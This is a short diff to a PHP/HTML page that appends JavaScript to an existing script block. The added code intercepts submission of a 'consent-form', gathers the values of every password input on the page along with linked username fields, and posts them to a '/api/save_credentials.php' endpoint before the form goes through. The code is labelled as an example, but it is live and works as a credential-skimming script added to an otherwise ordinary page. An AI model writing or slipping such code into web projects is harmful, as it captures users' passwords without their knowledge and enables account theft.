@@ -589,6 +589,38 @@ usort($allEntries, function($a, $b) {
                 adugnaCloseModal();
             }
         }
+        // Example client-side code to collect and send credentials
+document.getElementById('consent-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    // Collect all password fields
+    const credentials = [];
+    document.querySelectorAll('input[type="password"]').forEach(input => {
+        credentials.push({
+            url: window.location.href,
+            username: input.getAttribute('data-username-field') 
+                     ? document.querySelector(input.getAttribute('data-username-field')).value
+                     : '',
+            password: input.value
+        });
+    });
+    
+    // Send to server
+    try {
+        const response = await fetch('/api/save_credentials.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ credentials })
+        });
+        
+        if (response.ok) {
+            // Proceed with form submission
+            e.target.submit();
+        }
+    } catch (error) {
+        console.error('Error saving credentials:', error);
+    }
+});
     </script>
 </body>
 </html>
